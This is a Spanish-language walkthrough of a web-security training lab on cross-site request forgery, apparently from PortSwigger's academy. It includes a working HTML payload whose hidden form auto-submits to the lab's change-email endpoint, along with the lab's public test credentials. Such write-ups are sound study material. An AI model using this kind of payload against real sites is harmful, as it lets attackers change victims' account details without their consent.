# Cross-site request forgery (CSRF)

### Enunciado

Este laboratorio tiene una función para cambiar el correo electrónico que es vulnerable a ataques CSRF.

Para resolverlo, crea un código HTML que haga un ataque CSRF para cambiar la dirección de correo del usuario que vea la página. Después, súbelo a tu servidor de explotación.

Puedes iniciar sesión en tu propia cuenta con estas credenciales:

* Usuario: **wiener**
* Contraseña: **peter**

### Resolución

Nos logueamos. Interceptamos la petición de cambiar el email para mandarla al **Repeater**.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Es el único parámetro que se envía. Vamos al **exploit server** y ahí creamos la plantilla HTML maliciosa.

```
<html>
    <body>
        <form action='https://0a4100b10448eae680482b6e00b50061.web-security-academy.net/my-account/change-email' method='POST'>
            <input name="email" value="hola@beafn28.com" type="hidden"/>  
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Lo mandamos a la víctima y completamos el laboratorio.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>





